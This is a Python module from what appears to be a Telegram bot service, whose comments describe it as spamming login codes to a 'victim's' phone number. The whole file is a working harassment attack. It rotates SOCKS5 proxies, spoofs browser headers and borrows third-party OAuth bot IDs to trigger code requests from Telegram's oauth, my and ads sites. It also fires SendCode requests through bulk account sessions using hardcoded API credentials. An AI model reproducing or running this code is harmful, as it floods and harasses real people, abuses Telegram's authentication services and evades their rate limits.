# coding: utf-8
"""
Brown V2 | code_spam_snos.py
Спам кодами на номер жертвы.

Логика:
  — Берём все прокси из proxies.txt (до 20)
  — Каждый прокси отправляет 1 код через oauth.telegram.org / my.telegram.org / ads.telegram.org
  — Параллельно: SendCode через сессии (sessions/ + prem_sessions/)
  — КД на пользователя: 1 час
"""

import asyncio
import os
import random
import logging

import aiohttp
from telethon import TelegramClient
from telethon.tl.functions.auth import SendCodeRequest
from telethon.errors import FloodWaitError, PhoneNumberInvalidError

import config
from config import bot_logs
from utils import now_msk

logger = logging.getLogger(__name__)

MAX_PROXIES = 20

# API пары для telethon
API_PAIRS = [
    (24565698,  "5a084b434f8505ace703485b9da85040"),
    (27904162,  "e7cba879b1c643ba77490bf328df5eab"),
    (23037915,  "50f06f5b2223586fde0d1379ea91ebc7"),
    (29512095,  "0b29a7d42fff002856b9bed64f7ec919"),
    (25055016,  "25edf5b7becebe91a2d61fe8d9d9931b"),
]

# OAuth-сервисы для дёрганья кодов
OAUTH_SERVICES = [
    ("5444323279",  "https://fragment.com"),
    ("5731754199",  "https://steam.kupikod.com"),
    ("210944655",   "https://combot.org"),
    ("319709511",   "https://telegrambot.biz"),
    ("1199558236",  "https://bot-t.com"),
    ("5709824482",  "https://lzt.market"),
    ("1803424014",  "https://ru.telegram-store.com"),
    ("5463728243",  "https://www.spot.uz"),
    ("6708902161",  "https://ourauthpoint777.com"),
    ("1852523856",  "https://cabinet.presscode.app"),
]

bot = None
main_bot = None


def set_bot_code_spam(b):
    global bot, main_bot
    bot = b
    if main_bot is None:
        main_bot = b


# ─── Утилиты ──────────────────────────────────────────────────────────────────

def _rand_api():
    return random.choice(API_PAIRS)


def _get_sessions(folder="sessions") -> list[str]:
    if not os.path.exists(folder):
        return []
    return [
        os.path.join(folder, f.replace(".session", ""))
        for f in os.listdir(folder) if f.endswith(".session")
    ]


def _load_proxies() -> list[str]:
    path = "proxies.txt"
    if not os.path.exists(path):
        return []
    proxies = []
    with open(path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                proxies.append(line)
    return proxies[:MAX_PROXIES]


def _proxy_url(raw: str) -> str:
    parts = raw.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"socks5://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2:
        return f"socks5://{raw}"
    return raw


# ─── Отправка кода через одну сессию (Telethon) ───────────────────────────────

async def _sendcode_one(session_path: str, phone: str) -> tuple[str, str]:
    api_id, api_hash = _rand_api()
    name = os.path.basename(session_path)
    try:
        client = TelegramClient(session_path, api_id, api_hash,
                                system_version="4.16.30-vxCUSTOM")
        await asyncio.wait_for(client.connect(), timeout=8)
        if not await client.is_user_authorized():
            await client.disconnect()
            return name, "invalid"
        try:
            await client(SendCodeRequest(
                phone_number=phone,
                api_id=api_id,
                api_hash=api_hash,
                settings=None,  # type: ignore
            ))
            await client.disconnect()
            return name, "sent"
        except PhoneNumberInvalidError:
            await client.disconnect()
            return name, "invalid_phone"
        except FloodWaitError as e:
            await client.disconnect()
            return name, f"flood_{e.seconds}s"
        except Exception as e:
            await client.disconnect()
            return name, f"err_{str(e)[:30]}"
    except Exception as e:
        return name, f"conn_{str(e)[:20]}"


# ─── Отправка через oauth.telegram.org (1 прокси = 1 запрос) ─────────────────

async def _oauth_one(session: aiohttp.ClientSession,
                     phone: str, bot_id: str, origin: str,
                     proxy_url: str | None) -> tuple[str, bool]:
    url = "https://oauth.telegram.org/auth/request"
    headers = {
        "Accept": "*/*",
        "Accept-Language": "ru-RU,ru;q=0.9,en;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://oauth.telegram.org",
        "Referer": "https://oauth.telegram.org/auth",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/126.0.0.0 Safari/537.36"
        ),
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {
        "phone": phone,
        "bot_id": bot_id,
        "origin": origin,
        "request_access": "write",
        "return_to": origin,
    }
    service = origin.replace("https://", "").split("/")[0]
    try:
        kwargs: dict = {
            "headers": headers, "data": data,
            "timeout": aiohttp.ClientTimeout(total=10), "ssl": False,
        }
        if proxy_url:
            kwargs["proxy"] = proxy_url
        async with session.post(url, **kwargs) as resp:
            return service, resp.status == 200
    except Exception:
        return service, False


async def _mytg_one(session: aiohttp.ClientSession,
                    phone: str, proxy_url: str | None) -> tuple[str, bool]:
    url = "https://my.telegram.org/auth/send_password"
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "ru-RU,ru;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://my.telegram.org",
        "Referer": "https://my.telegram.org/auth",
        "User-Agent": (
            "Mozilla/5.0 (Linux; Android 10; K) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/126.0.0.0 Mobile Safari/537.36"
        ),
        "X-Requested-With": "XMLHttpRequest",
    }
    try:
        kwargs: dict = {
            "headers": headers, "data": {"phone": phone},
            "timeout": aiohttp.ClientTimeout(total=10), "ssl": False,
        }
        if proxy_url:
            kwargs["proxy"] = proxy_url
        async with session.post(url, **kwargs) as resp:
            return "my.telegram.org", resp.status == 200
    except Exception:
        return "my.telegram.org", False


async def _ads_one(session: aiohttp.ClientSession,
                   phone: str, proxy_url: str | None) -> tuple[str, bool]:
    url = "https://ads.telegram.org/auth/"
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "ru-RU,ru;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://my.telegram.org",
        "Referer": "https://my.telegram.org/auth",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/126.0.0.0 Safari/537.36"
        ),
        "X-Requested-With": "XMLHttpRequest",
    }
    try:
        kwargs: dict = {
            "headers": headers, "data": {"phone": phone},
            "timeout": aiohttp.ClientTimeout(total=10), "ssl": False,
        }
        if proxy_url:
            kwargs["proxy"] = proxy_url
        async with session.post(url, **kwargs) as resp:
            return "ads.telegram.org", resp.status == 200
    except Exception:
        return "ads.telegram.org", False


# ─── Главный флуд: 1 прокси = 1 код ──────────────────────────────────────────

async def _flood_proxy_codes(phone: str, proxies: list[str]) -> dict:
    """
    Каждый прокси отправляет ровно 1 запрос кода.
    Сервис выбирается циклически (oauth → mytg → ads → oauth → ...).
    Возвращает {"sent": int, "total": int}.
    """
    tasks = []
    oauth_pool = list(OAUTH_SERVICES) * 10  # достаточно для любого кол-ва прокси

    async with aiohttp.ClientSession() as session:
        for i, raw_proxy in enumerate(proxies):
            purl = _proxy_url(raw_proxy)
            slot = i % (len(OAUTH_SERVICES) + 2)  # +2 для mytg и ads

            if slot < len(OAUTH_SERVICES):
                bot_id, origin = oauth_pool[slot]
                tasks.append(_oauth_one(session, phone, bot_id, origin, purl))
            elif slot == len(OAUTH_SERVICES):
                tasks.append(_mytg_one(session, phone, purl))
            else:
                tasks.append(_ads_one(session, phone, purl))

        results = await asyncio.gather(*tasks, return_exceptions=True)

    sent = sum(
        1 for r in results
        if isinstance(r, tuple) and len(r) == 2 and r[1] is True
    )
    return {"sent": sent, "total": len(proxies)}


async def _flood_sessions(phone: str) -> dict:
    sessions = _get_sessions() + _get_sessions("prem_sessions")
    if not sessions:
        return {"sent": 0, "total": 0}
    random.shuffle(sessions)
    results = await asyncio.gather(*[_sendcode_one(s, phone) for s in sessions],
                                   return_exceptions=True)
    sent = sum(1 for _, st in results if isinstance(st, str) and st == "sent")
    return {"sent": sent, "total": len(sessions)}


# ─── Точка входа ──────────────────────────────────────────────────────────────

async def main_code_spam(user_id: int, username: str, phone: str):
    """
    Спам кодами на номер жертвы.
    phone — номер в формате +79991234567
    """
    import keyboards

    ts = now_msk().strftime("%d.%m.%Y %H:%M:%S")
    proxies = _load_proxies()

    await bot.send_message(
        user_id,
        f"📲 *Спам кодами — старт*\n"
        f"*└─ Номер:* `{phone}`\n"
        f"*└─ Прокси:* `{len(proxies)}`\n\n"
        f"🚀 *Атака запущена...*",
        parse_mode="Markdown",
    )

    # Запускаем параллельно: прокси-коды + сессии
    proxy_task = asyncio.create_task(_flood_proxy_codes(phone, proxies))
    session_task = asyncio.create_task(_flood_sessions(phone))

    pr, sc = await asyncio.gather(proxy_task, session_task)

    summary_user = (
        f"📊 *Спам кодами — итог*\n\n"
        f"📱 *Номер:* `{phone}`\n\n"
        f"🌐 *Коды через прокси:* `{pr['sent']}/{pr['total']}`\n"
        f"📲 *SendCode сессии:* `{sc['sent']}/{sc['total']}`\n\n"
        f"⏰ `{ts}`"
    )
    summary_log = (
        f"📲 *Code Spam*\n"
        f"📱 `{phone}`\n"
        f"🌐 Proxy: `{pr['sent']}/{pr['total']}` | "
        f"SC: `{sc['sent']}/{sc['total']}`\n"
        f"👤 {user_id} (@{username})\n"
        f"⏰ {ts}"
    )

    await bot.send_message(
        user_id, summary_user,
        parse_mode="Markdown",
        reply_markup=keyboards.main_menu,
    )
    await main_bot.send_message(bot_logs, summary_log, parse_mode="Markdown")
